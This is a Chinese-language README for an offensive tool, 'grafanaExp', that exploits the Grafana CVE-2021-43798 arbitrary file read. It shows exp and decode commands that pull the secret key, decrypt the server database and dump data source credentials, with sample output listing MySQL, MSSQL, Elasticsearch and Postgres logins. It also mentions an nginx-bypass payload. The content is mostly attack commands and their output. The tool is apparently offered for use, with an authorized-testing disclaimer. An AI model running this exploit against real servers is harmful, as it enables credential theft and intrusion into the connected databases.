# grafanaExp

利用grafana CVE-2021-43798任意文件读漏洞，自动探测是否有漏洞、存在的plugin、提取密钥、解密server端db文件，并输出`data_sourrce`信息。

## 使用方法
提供exp和decode功能。
```
➜  ./grafanaExp -h
NAME:
   grafanaExp - Exploit Grafana with CVE-2021-43798 Arbitrary File Read.

USAGE:
   grafanaExp [global options] command [command options] [arguments...]

AUTHOR:
   A&D-Team

COMMANDS:
   exp      -u [url] -p [plugin] -c [config] -d [db] -k [key]
   decode   decode -f [dbfile] -k [key]
   help, h  Shows a list of commands or help for one command

GLOBAL OPTIONS:
   --help, -h  show help (default: false)

```

### Exp
自动探测是否有漏洞、存在的plugin、提取密钥、解密server端db文件，并输出`data_souce`信息：
```
➜  ./grafanaExp exp -u http://localhost:3000/ 
2021/12/07 22:19:10 Target vulnerable has plugin [alertlist]
2021/12/07 22:19:10 Get secret_key [SW2YcwTIb9zpOOhoPsMm]
2021/12/07 22:19:10 type:[mysql]        name:[MySQL_01]         url:[test.mysql.io:3306]        user:[root]     password[rootpassword]  database:[test_dbname]  basic_auth_user:[]      basic_auth_password:[]
2021/12/07 22:19:10 type:[mssql]        name:[Mssql_01]         url:[test_sqlserver:1433]       user:[admin]    password[adminpassword] database:[db_sqlserver] basic_auth_user:[]      basic_auth_password:[]
2021/12/07 22:19:10 type:[elasticsearch]        name:[es_01]            url:[http://localhost:9200]     user:[] password[]      database:[]     basic_auth_user:[basic_user]    basic_auth_password:[basic_pass]
2021/12/07 22:19:10 type:[postgres]     name:[Postgre_01]               url:[Postgre_01:5432]   user:[pppp]     password[sssswwwww]     database:[postgredb]    basic_auth_user:[]      basic_auth_password:[]
2021/12/07 22:19:10 All Done, have nice day!

```

### Decode
当DB文件太大的时候，可先下载到本地，之后再本地解密：
```
➜ ./grafanaExp decode -f grafana.db -k SW2YcwTIb9zpOOhoPsMm
2021/12/07 23:00:20 type:[mysql]        name:[MySQL_01]         url:[test.mysql.io:3306]        user:[root]     password[rootpassword]  database:[test_dbname]  basic_auth_user:[]      basic_auth_password:[]
2021/12/07 23:00:20 type:[mssql]        name:[Mssql_01]         url:[test_sqlserver:1433]       user:[admin]    password[adminpassword] database:[db_sqlserver] basic_auth_user:[]      basic_auth_password:[]
2021/12/07 23:00:20 type:[elasticsearch]        name:[es_01]            url:[http://localhost:9200]     user:[] password[]      database:[]     basic_auth_user:[basic_user]    basic_auth_password:[basic_pass]
2021/12/07 23:00:20 type:[postgres]     name:[Postgre_01]               url:[Postgre_01:5432]   user:[pppp]     password[sssswwwww]     database:[postgredb]    basic_auth_user:[]      basic_auth_password:[]
```

## 更新
```
1、支持https （昨天没加因为 transport会有一些奇奇怪怪的问题
2、增加darwin的执行文件
3、增加绕过nginx的paylaod （裸改了一下net/http
```

## 申明

本程序应仅用于授权的安全测试与研究目的
